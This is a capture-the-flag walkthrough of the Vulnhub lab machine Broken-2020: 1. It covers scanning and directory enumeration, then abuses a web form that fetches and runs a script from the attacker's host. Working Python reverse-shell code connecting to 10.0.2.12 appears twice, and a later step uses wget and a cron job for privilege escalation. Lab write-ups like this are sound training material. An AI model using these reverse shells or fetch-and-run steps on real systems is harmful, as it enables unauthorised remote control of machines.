|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# **Broken-2020: 1**

This virtual machine is released on April 22, 2020 by [EuSecuinfo](http://secuinfo.eu/) at Vulnhub.  The goal is to get the user and root flags.  However, there is no public exploitation to be used for the vulnerability.  The author suggests to use custom exploitation instead.

There are a total of 4 flags to be got.
 
Available on : [Vulnhub](https://www.vulnhub.com/entry/broken-2020-1,470/)  
Difficulty : Beginner for user flag and intermediate for root flag.  
Format : OVA (Virtualbox)  

Kali Linux 2020.1b is used for the testing and its IP address is 10.0.2.12.

To find out the IP address of the Broken-2020 virtual machine.  The IP address is ```10.0.2.27```.

```bash
sudo netdiscover -r 10.0.2.0/24
```

```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                   
                                                                                                                                 
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                
 10.0.2.3        08:00:27:98:74:d1      1      60  PCS Systemtechnik GmbH                                                        
 10.0.2.27       08:00:27:66:c1:fa      1      60  PCS Systemtechnik GmbH                                                        
samiux@kali:~$ 
```

Then carrying out a port scan on the target.

```bash
sudo nmap --open -sV 10.0.2.27
```

```bash
samiux@kali:~$ sudo nmap --open -sV 10.0.2.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 03:20 HKT
Nmap scan report for 10.0.2.27
Host is up (0.00018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:66:C1:FA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
samiux@kali:~$ 
```

The screenshot of ```10.0.2.27```.

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/001.png)  

To scan for the directories of the target.

```bash
gobuster dir -u http://10.0.2.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```bash
samiux@kali:~$ gobuster dir -u http://10.0.2.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.27
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/05/08 03:23:55 Starting gobuster
===============================================================
/index.html (Status: 200)
/images (Status: 301)
/cms (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/08 03:26:47 Finished
===============================================================
samiux@kali:~$ 
```
Go to ```http://10.0.2.27/cms``` and an Installation page is displayed.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/002.png)  

Seeing that there is a ```Install``` button and pressed accordingly.

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/003.png)  

A link ```go here``` is shown.  If you do not press this link, no further step can be processed.  Therefore, make sure you press this link.  After the link is pressed, the following screen will be shown.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/004.png)  

Now, you will find nothing on that page.  Go back to the home page again and you will see the home page has been defaced.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/005.png)  
 
Then go to ```/cms``` again and the ```FLAG1``` had been found.

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/006.png)  

Try to scan the directories again.

```bash
gobuster dir -u http://10.0.2.27/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```bash
samiux@kali:~$ gobuster dir -u http://10.0.2.27/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.27/cms
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/05/08 03:34:55 Starting gobuster
===============================================================
/index.html (Status: 200)
/cc (Status: 301)
===============================================================
2020/05/08 03:37:50 Finished
===============================================================
samiux@kali:~$ 
```  

```bash
samiux@kali:~$ gobuster dir -u http://10.0.2.27/cms/cc -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.27/cms/cc
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2020/05/08 03:39:01 Starting gobuster
===============================================================
/index.php (Status: 200)
===============================================================
2020/05/08 03:42:02 Finished
===============================================================
samiux@kali:~$ 
```

A new directory ```/cms/cc``` is shown.  Go to that directory and a new page is displayed.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/007.png)

Try to enter ```127.0.0.1``` and port ```80``` to the page and you will see the error message ```Server can't reach the script```.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/009.png)  

After thinking for a while, why not try to enter my Kali's IP address?

```bash
nc -lvp 4444
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/010.png)  

```bash
samiux@kali:~$ nc -lvp 4444
[sudo] password for samiux: 
listening on [any] 99 ...
10.0.2.27: inverse host lookup failed: Unknown host
connect to [10.0.2.12] from (UNKNOWN) [10.0.2.27] 55128
GET /4f367c82884fdafb83166308839e37a4.sh HTTP/1.0
Host: 10.0.2.12:4444
Connection: close

id
samiux@kali:~$ 
```

From the result, the exploit requires to access ```4f367c82884fdafb83166308839e37a4.sh``` at my Kali box.  Then setup a web server at my Kali box and set ```4f367c82884fdafb83166308839e37a4.sh``` to run ```ls -la```.

```bash
python3 -m http.server 4444
```

```bash
nano 4f367c82884fdafb83166308839e37a4.sh
ls -la
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/011.png)  

It works as expected.  Try to use bash to run the reverse shell but it does not work properly.  The bash is at ```/usr/bin/bash```.  Then change to Python to launch a reverse shell.

```bash
nano 4f367c82884fdafb83166308839e37a4.sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/bash","-i"]);'
```

```bash
python3 -m http.server 4444
```

```bash
nc -lvp 5555
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/013.png)  

We got the workable reverse shell.  Then go to ```/home/alice``` and we found the ```FLAG2```.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/014.png)  

Then go to ```/back``` directory and find some interesting stuff.  

```bash
www-data@broken:/$ ls -la
ls -la
total 73
drwxr-xr-x 19 root root  4096 Mar 25 19:36 .
drwxr-xr-x 19 root root  4096 Mar 25 19:36 ..
drwxr-xr-x  3 root root  4096 Mar 25 19:36 back
-rwxr-xr-x  1 root root   493 Mar 25 19:36 backup.py
lrwxrwxrwx  1 root root     7 Mar 24 08:14 bin -> usr/bin
drwxr-xr-x  4 root root  1024 Mar 24 08:28 boot
drwxr-xr-x 18 root root  3160 May  8 17:19 dev
drwxr-xr-x 81 root root  4096 May  8 17:33 etc
-rw-r--r--  1 root root     0 Mar 25 19:36 flag.txt
drwxr-xr-x  3 root root  4096 Mar 24 08:29 home
lrwxrwxrwx  1 root root    30 Mar 24 08:17 initrd.img -> boot/initrd.img-4.19.0-8-amd64
lrwxrwxrwx  1 root root    30 Mar 24 08:17 initrd.img.old -> boot/initrd.img-4.19.0-8-amd64
lrwxrwxrwx  1 root root     7 Mar 24 08:14 lib -> usr/lib
lrwxrwxrwx  1 root root     9 Mar 24 08:14 lib32 -> usr/lib32
lrwxrwxrwx  1 root root     9 Mar 24 08:14 lib64 -> usr/lib64
lrwxrwxrwx  1 root root    10 Mar 24 08:14 libx32 -> usr/libx32
drwx------  2 root root 16384 Mar 24 08:14 lost+found
drwxr-xr-x  3 root root  4096 Mar 24 08:14 media
drwxr-xr-x  2 root root  4096 Mar 24 08:14 mnt
drwxr-xr-x  2 root root  4096 Mar 24 08:14 opt
dr-xr-xr-x 94 root root     0 May  8 17:19 proc
drwx------  5 root root  4096 May  8 17:34 root
drwxr-xr-x 19 root root   580 May  8 17:19 run
lrwxrwxrwx  1 root root     8 Mar 24 08:14 sbin -> usr/sbin
drwxr-xr-x  2 root root  4096 Mar 24 08:14 srv
dr-xr-xr-x 13 root root     0 May  8 17:22 sys
drwxrwxrwt  2 root root  4096 May  8 17:19 tmp
drwxr-xr-x 13 root root  4096 Mar 24 08:14 usr
drwxr-xr-x 12 root root  4096 Mar 24 08:45 var
lrwxrwxrwx  1 root root    27 Mar 24 08:17 vmlinuz -> boot/vmlinuz-4.19.0-8-amd64
lrwxrwxrwx  1 root root    27 Mar 24 08:17 vmlinuz.old -> boot/vmlinuz-4.19.0-8-amd64
www-data@broken:/$ 
```

```bash
www-data@broken:/$ cd back
cd back
www-data@broken:/back$ ls
ls
backup
backup.py
check.py
hack.sh
load.sh
post
root
```

We found three interesting files.  They are ```check.py```, ```load.sh``` and ```hack.sh```.

```bash
www-data@broken:/back$ cat check.py
cat check.py
import os

file=os.listdir("/home/alice/script")
nbfile=len(file)


if nbfile != 2 :

        os.system("/root/hack.sh")
www-data@broken:/back$ 
```

```bash
www-data@broken:/back$ cat load.sh
cat load.sh
#!/bin/sh
cp -r * ../
cp /root/post /var/spool/cron/crontabs/root
chmod 600 /var/spool/cron/crontabs/root
rm -r /home/alice/backup

www-data@broken:/back$ 
```

```bash
www-data@broken:/back$ cat hack.sh
cat hack.sh
#!/bin/sh
mv /root/backup /home/alice/backup
chown -R alice:alice /home/alice/backup
chmod 700 /home/alice/backup


rm /var/spool/cron/crontabs/root
cp /root/root /var/spool/cron/crontabs/root
chmod 600 /var/spool/cron/crontabs/root


rm hack.sh check.py load.sh root post

www-data@broken:/back$ 
```

According to ```check.py```, we know that if there are more than 2 files in the ```/home/alice/script``` directory, ```hack.sh``` will be ran.  Meanwhile, the cron job will be running on one minute interval.

An empty file is created on ```/home/alice/script``` directory and wait for one minute to see what will be happened.  

```bash
cd /home/alice/script
touch test
```

We go to ```/back/backup``` directory and found some interesting stuff there.  The ```backup``` is empty in the beginning.  We found the final flag ```FLAG3``` there.  Thinking that it is the last flag.    

```bash
www-data@broken:/back$ cd /back 
cd /back
www-data@broken:/back$ ls
ls
backup
backup.py
check.py
hack.sh
load.sh
post
root
www-data@broken:/back$ cd backup
cd backup
www-data@broken:/back/backup$ ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 Mar 25 19:36 .
drwxr-xr-x 3 root root 4096 Mar 25 19:36 ..
-rw-r--r-- 1 root root   27 Mar 25 19:36 flag.txt
-rw-r--r-- 1 root root    0 Mar 25 19:36 logbot.log
-rw-r--r-- 1 root root  129 Mar 25 19:36 note.txt
-rw-r--r-- 1 root root    0 Mar 25 19:36 path.txt
www-data@broken:/back/backup$ 
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/021.png)  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/022.png)  

After seeing this note, that mean there is something to do further.  The FLAG3 may not be the last flag.  Planning to put a directory to the ```path.txt```.  It is going to put ```/root``` to the ```path.txt```.

We need to be ```alice``` rights to do so.  However, we are at ```www-data``` rights at the moment.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.

At Kali box, create a ```log.py``` with the following reverse shell.

```python
#!/usr/bin/python2.7

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.12",6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/usr/bin/bash","-i"])
```

```bash
nc -lvp 6666
```

At Broken box at ```/home/alice/script```, do the following and wait for a minute.  A reverse shell is ported at port 6666.

```bash
cd /home/alice/script
mv log.py log1.py
wget http://10.0.2.12:4444/log.py
chmod +x log.py
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/023.png)  

Go to ```/home/alice/backup``` and put ```/root``` to the ```path.txt```.  Then wait for a mintue.

```bash
cd /home/alice/backup
echo "/root" > path.txt
```

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/024.png)  

Then go to ```/home/alice/backup/root``` and we get the last flag.  

![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/025.png)  

Root is dancing!

## Final thought

This is a typical Capture The Flag (CTF) game.  It is testing your basic Linux skill, hacking skill and python as well as bash scripting skill.  There is no public exploitation to be used.  It is a very interesting box.  Recommended!

Samiux  
OSCE  OSCP  OSWP  
May 9, 2020, Hong Kong, China  

|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|
